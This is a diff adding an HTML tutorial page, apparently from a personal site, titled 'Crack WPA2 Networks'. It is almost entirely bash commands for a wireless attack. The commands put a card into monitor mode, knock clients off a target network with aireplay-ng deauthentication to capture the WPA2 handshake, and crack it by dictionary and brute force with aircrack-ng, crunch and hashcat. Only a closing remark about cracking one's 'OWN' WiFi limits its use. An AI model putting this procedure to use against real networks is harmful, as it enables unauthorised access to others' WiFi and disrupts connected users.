@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="../../assets/css/main.css" />
+    <title>Document</title>
+</head>
+
+<body>
+    <div class="main-container">
+        <h1 class="heading">Crack WPA2 Networks</h1>
+        <div class="text-content">
+            <h2>Get Handshake</h2>
+            <h3>install needed dependencies</h3>
+            <pre>
+                <code class="language-bash">
+sudo apt install aircrack-ng crunch -y # optionally "hashcat"
+                </code>
+            </pre>
+            <h3>setting your interface to monitor mode</h3>
+            <pre>
+                <code class="language-bash">
+sudo airmon-ng check kill # kill processes that could interfere
+sudo airmon-ng start wlan0 # set interface to monitor mode
+                </code>
+            </pre>
+            <h3>gather network packets</h3>
+            <pre>
+                <code class="language-bash">
+sudo airodump-ng wlan0 # remember bssid and channel
+sudo airodump-ng --bssid ? --channel ? --write hash wlan0
+                </code>
+            </pre>
+            <h3>force clients to reconnect to the target network</h3>
+            <pre>
+                <code class="language-bash">
+sudo aireplay-ng -0 2 -a ? -c ? wlan0 # -a -> AP MAC, -c -> Client MAC
+                </code>
+            </pre>
+            <h2>Crack the hash file via dictionary attack (cpu, aircrack-ng)</h2>
+            <pre>
+                <code class="language-bash">
+sudo aircrack-ng hash.cap -w /path/to/the/dictionary
+                </code>
+            </pre>
+            <p>
+                get a wordlist (e.g. <a href="https://gitlab.com/kalilinux/packages/wordlists/-/raw/kali/master/rockyou.txt.gz">rockyou.txt.gz)</a><br />Kali Linux has rockyou located at /usr/share/wordlist/rockyou.txt.gz
+            </p>
+            <h3>unzip on kali linux</h3>
+            <pre>
+                <code class="language-bash">
+cd /usr/share/wordlist/
+sudo gzip -d rockyou.txt.gz
+            </code>
+            </pre>
+            <h3>cracking the hash with rockyou</h3>
+            <pre>
+                <code class="language-bash">
+sudo aircrack-ng hash.cap -w /path/to/the/dictionary # e.g. /usr/share/wordlist/rockyou.txt
+                </code>
+            </pre>
+            <h2>Crack the hash via bruteforce (cpu, crunch/ aircrack-ng)</h2>
+            <h3>
+            generate a 8-10 long password with the chracters "abcdefgABC123?"
+            </h3>
+            <pre>
+                <code class="language-bash">
+crunch 8 10 abcdefgABC123? | sudo aircrack-ng -e wifiname -w - /path/to/the/hash/file
+                </code>
+            </pre>
+            <h2>Crack the hash via dictionary attack (gpu, hashcat)</h2>
+            <p>
+            convert cap file from airodump-ng to hc22000 for hashcat using
+            <a href="https://hashcat.net/cap2hashcat/">cap2hashcat</a> online converter
+                </p>
+            <pre>
+                <code class="language-bash">
+hashcat -m 22000 hash.hc22000 rockyou.txt
+                </code>
+            </pre>
+            <h2>Cracking the hash file via bruteforce (gpu, hashcat)</h2>
+            <pre>
+                <code class="language-bash">
+hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d # 8 digit numeric password
+                </code>
+            </pre>
+            <p>hashcat mask:</p>
+            <pre>
+                <code class="language-plain">
+?l = abcdefghijklmnopqrstuvwxyz
+?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
+?d = 0123456789
+?s =  !"#$%&'()*+,-./:;&lt;=>?@[\]^_\`{|}~
+?a = ?l?u?d?s
+?b = 0x00 - 0xff
+                </code>
+            </pre>
+            <h2>That's it!</h2>
+            <p>
+                This is just a basic tutorial.<br />More about hashcat can be found <a href="https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2">here</a>.
+            </p>
+            <p>
+                If you have questions left contact me at contact@phoenixthrush.com and have fun cracking your <b>OWN</b> WIFI!
+            </p>
+        </div>
+    </div>
+    <script src="../../assets/js/prism.js"></script>
+</body>
+</html>
